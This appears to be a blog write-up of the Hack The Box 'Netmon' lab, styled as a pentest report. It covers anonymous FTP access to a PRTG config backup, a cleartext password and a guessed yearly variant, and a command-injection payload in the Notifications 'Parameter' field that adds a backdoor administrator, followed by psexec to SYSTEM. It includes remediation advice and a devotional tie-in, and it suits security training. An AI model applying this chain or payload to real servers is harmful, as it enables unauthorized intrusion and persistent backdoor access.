# Netmon

Uncovering hidden sins in the file system 📂 and using the "Notifications" feature to seize the throne. ⚔️

***

### 🎯 Netmon: Uncovering Weak Credentials in Enterprise Monitoring

![](https://cdn-images-1.medium.com/max/800/1*0d8zFwWJnfSE9pYwQVSEkg.png)

Image created by Nicholas Mullenski (Gemini)

**Target:** Netmon (10.10.10.152) **OS:** Windows Server 2016 **Difficulty:** Easy **Attack Vectors:** Anonymous FTP -> Cleartext Credentials -> Remote Command Execution (RCE).

> [**Not a Member?? Click Here To Read Full-Story**](https://nicholasmullenski.medium.com/1948b32bc426?sk=0b28f113da5be38a9e615832f9a5e34e)

### Executive Summary

**Assessment Date:** _January 1, 2026_ **Risk Level:** _CRITICAL_ **Author:** _Nicholas Mullenski_

### Overview

An assessment of the “Netmon” server revealed a critical lapse in configuration management that led to a full system compromise. The server, running **PRTG Network Monitor**, was configured with **Anonymous FTP** access enabled on the system root. This allowed unauthenticated extraction of sensitive configuration backup files.

### Key Findings

1. **Unauthorized File Access:** The FTP service allowed anonymous users to browse the **`C:\`** drive. This led to the discovery of the **`user.txt`** flag and, more critically, PRTG configuration backups (**`PRTG Configuration.old.bak`**).
2. **Cleartext Credentials:** Analysis of the backup files revealed hardcoded administrative credentials (**`prtgadmin`**) that were valid for the live PRTG web interface.
3. **Remote Code Execution:** Authenticated access to the PRTG dashboard was leveraged to execute system commands via the “Notifications” feature, granting **`NT AUTHORITY\SYSTEM`** privileges.

### Strategic Recommendation

Immediate disablement of Anonymous FTP is required. Furthermore, PRTG configuration files must be excluded from public-facing directories, and service accounts should be rotated immediately.

### 1.0 Initial Foothold

#### 1.1 Reconnaissance & Enumeration

#### **1.1.1 Nmap Scan**

* We began the engagement with a comprehensive port scan to identify the attack surface.

**Command:**

```
nmap -sC -sV -A -p- -vvv 10.10.10.152 -Pn --min-rate=5000
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  07:08AM       <DIR>          Users
| 02-25-19  09:56PM       <DIR>          Program Files
80/tcp    open  http          Indy httpd 18.1.37.13946 (PRTG Network Monitor)
445/tcp   open  microsoft-ds  Windows Server 2016/2019
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
```

#### 1.1.2 Analysis

* The scan results indicated a high-priority misconfiguration: **Port 21 (FTP)** allows anonymous login and appears to expose the entire system drive (**`C:\`**). Additionally, **Port 80** is hosting **PRTG Network Monitor**, a complex enterprise monitoring solution known to store credentials in configuration files.

#### 1.2 Information Disclosure (FTP)

#### 1.2.1 Retrieving the User Flag

* Leveraging the anonymous FTP access, I navigated to the Public user directory to retrieve the first proof of compromise.

**Command:**

```
ftp 10.10.10.152
ftp> cd Users/Public
ftp> get user.txt
```

**Flag:**

```
┌──(nicholas㉿Nicholas)-[~/HTB/Labs/Netmon]
└─$ cat user.txt
c087df331bec8873e8836ce479351431
```

#### 1.2.2 Hunting for Secrets

* The primary objective was to locate configuration data for the PRTG Network Monitor. PRTG is known to store backups in **`C:\ProgramData\Paessler\PRTG Network Monitor`**. I navigated to this directory via FTP and identified a backup file named **`PRTG Configuration.old.bak`**.

**Command:**

```
ftp> cd "/ProgramData/Paessler/PRTG Network Monitor"
ftp> get "PRTG Configuration.old.bak"
```

### 2.0 Credential Harvesting

#### 2.1 Configuration Analysis

#### 2.1.1

* After exfiltrating the configuration backup, I analyzed the file for sensitive strings, specifically looking for database credentials.

**Command:**

```
grep -a -A 5 "dbpassword" "PRTG Configuration.old.bak"
```

**Findings:** The file contained cleartext credentials for the `prtgadmin` user.

```
<dbpassword>
  PrTg@dmin2018
</dbpassword>
```

#### 2.2 Password Mutation Strategy

#### 2.2.1

* Initial attempts to log in to the web interface with **`PrTg@dmin2018`** failed. Hypothesizing a standard corporate password rotation policy (incrementing the year), I attempted the password **`PrTg@dmin2019`**. This mutation was successful, granting Administrative access to the PRTG dashboard.

### 3.0 Exploitation (RCE to Root)

#### 3.1 The Notification Attack Vector

#### 3.1.1

* **PRTG Network Monitor** includes a “Notifications” feature that allows administrators to execute scripts when specific system alerts occur. This feature runs with **`SYSTEM`** privileges by default.

**Methodology:**

1. I authenticated to the web dashboard using the credentials found in the backup (**`prtgadmin`** / **`PrTg@dmin2019`**).

![](https://cdn-images-1.medium.com/max/800/1*IVgRZUj8AXb6eoSjiNCceA.png)

2\. I navigated to **Setup > Account Settings > Notifications.**

3\. I created a new notification named **`Pwned`** and selected the **"Execute Program"** option.

![](https://cdn-images-1.medium.com/max/800/1*s6t0yzwvkIIF7Jb-bQNPHw.png)

4\. I injected a command into the “Parameter” field to create a backdoor administrator account.

**Injection Payload:**

```
test.txt;net user hacker Password123! /add;net localgroup administrators hacker /add
```

#### 3.2 Execution & Verification

* After saving the notification, I manually triggered it using the “Test” function in the PRTG dashboard. I then utilized **`impacket-psexec`** to verify the creation of the backdoor admin account and obtain a shell.

![](https://cdn-images-1.medium.com/max/800/1*GgTYkdv9oD-i0YHntqp82A.png)

Click the Bell to trigger the Notification.

**Command:**

```
impacket-psexec hacker:'Password123!'@10.10.10.152
```

**Result:** The connection was successful, dropping me into a `SYSTEM` level shell.

```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 10.10.10.152.....
[*] Found writable share ADMIN$
[*] Uploading file wQZMRKPc.exe
[*] Opening SVCManager on 10.10.10.152.....
[*] Creating service eFwh on 10.10.10.152.....
[*] Starting service eFwh.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
51db7dd59f808849242b803eb8f020b0
```

![](https://cdn-images-1.medium.com/max/800/1*HTvb2W5RaH5ZgZtceO-VeQ.png)

Image created by Nicholas Mullenski (Gemini)

### Loot (Flags)

**User Flag:**

```
c087df331bec8873e8836ce479351431
```

**Root Flag:**

```
51db7dd59f808849242b803eb8f020b0
```

### 4.0 Executive Conclusion

* The **Netmon** engagement highlights how a chain of “low” severity issues can lead to a critical breach.

1. **Anonymous FTP:** Provided the initial entry point to read the filesystem.
2. **Weak Permissions:** Allowed the retrieval of sensitive configuration files (**`ProgramData`**).
3. **Hardcoded Credentials:** The cleartext password in the backup file, combined with a predictable rotation policy, allowed for web authentication.
4. **Insecure Features:** The PRTG Notification system provided a native mechanism for Remote Code Execution (RCE) as SYSTEM.

### Red Team Mandate

**Remediation Strategy:**

1. **Disable Anonymous FTP:** The FTP service on Port 21 must be secured immediately. Anonymous access to the system root is a critical vulnerability.
2. **Secure Configuration Files:** PRTG configuration files (`.dat`, `.bak`) must be excluded from public or low-privileged directories. Ensure that passwords stored in these files are encrypted or hashed.
3. **Service Hardening:** Run the PRTG Core Server service as a dedicated service account with the principle of least privilege, rather than `LocalSystem`, to limit the impact of RCE.

### The Biblical Tie-In

In this lab, the administrators tried to hide their secrets (passwords) in a “hidden” folder (`ProgramData`) and in an "old" backup file, thinking they were safe. But because the door (FTP) was left slightly ajar, everything hidden was brought into the light.

> _**“For there is nothing hidden that will not be disclosed, and nothing concealed that will not be known or brought out into the open.” — Luke 8:17 (NIV)**_

**Application:** We often think our “old” sins or hidden habits are safe because they are buried in the “backup files” of our past or hidden deep in our hearts. We think no one can see them. But God has “Root access” to our hearts. He sees every directory, every hidden file, and every secret. The goal isn’t to hide these things better, but to bring them to Him for deletion and cleansing so we can run clean.

### 🚀 Join the Mission

I don’t want to do this alone. I want to build a community of people who are hungry to learn, build, and break things (ethically). I am constantly looking for the next challenge.

* Is there a specific tool you wish existed?
* Is there a hacking concept you want me to learn and explain?
* Do you have a “brick wall” you’re hitting in your own research?

Jump into the server, drop a message, and tell me what I should build or learn next. Let’s sharpen each other.

[**Join the Iron-Breach Discord Server!**\
_&#x41;n advanced study group for Offensive Security professionals and students. We specialize in Red Teaming simulation…_&#x64;iscord.gg](https://discord.gg/y5P9NrzUBX)

By [Nicholas Mullenski](https://medium.com/@nicholasmullenski) on [January 21, 2026](https://medium.com/p/1948b32bc426).

[Canonical link](https://medium.com/@nicholasmullenski/%EF%B8%8F-nothing-hidden-exposing-netmons-deadly-secrets-1948b32bc426)

Exported from [Medium](https://medium.com) on September 1, 2026.
